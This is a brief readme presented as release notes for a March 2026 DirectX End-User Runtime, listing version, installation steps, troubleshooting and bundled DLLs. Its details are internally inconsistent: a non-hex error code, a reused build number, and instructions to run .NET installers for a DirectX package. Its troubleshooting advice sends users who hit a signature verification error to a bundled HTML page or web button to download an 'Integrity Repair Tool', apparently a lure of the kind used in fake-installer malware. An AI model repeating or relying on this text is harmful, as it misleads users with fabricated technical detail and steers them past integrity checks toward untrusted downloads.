DirectX End-User Runtime (March 2026 Release)
--------------------------------------------------
Version: 11.2.9600.16384
Build: 2026.03.07-FINAL
Support ID: KB4028529
Time and date release 3/7/2026

OVERVIEW:
This package provides updates to the DirectX End-User Runtime and 
all previous DirectX releases. This includes the localized 
redistributable files for the D3DX, XACT, and Managed DirectX 
components.

INSTALLATION INSTRUCTIONS:
1. Ensure all background applications are closed.
2. Run .NET 10.0.103  setup.exe than .NET 4.5.2 setup.exe
TROUBLESHOOTING:
If the installation fails with a Signature Verification Error (0x7U18E0OR), 
please consult the included "Website support.html" or click the 
"Web Help" button within the installer to download the 
Integrity Repair Tool (KB4028529).

COMPONENTS INCLUDED:
- d3d11.dll (v11.2)
- dxgi.dll (v11.2)
- setup.ini (Config)
- dxupdate.inf (Manifest)
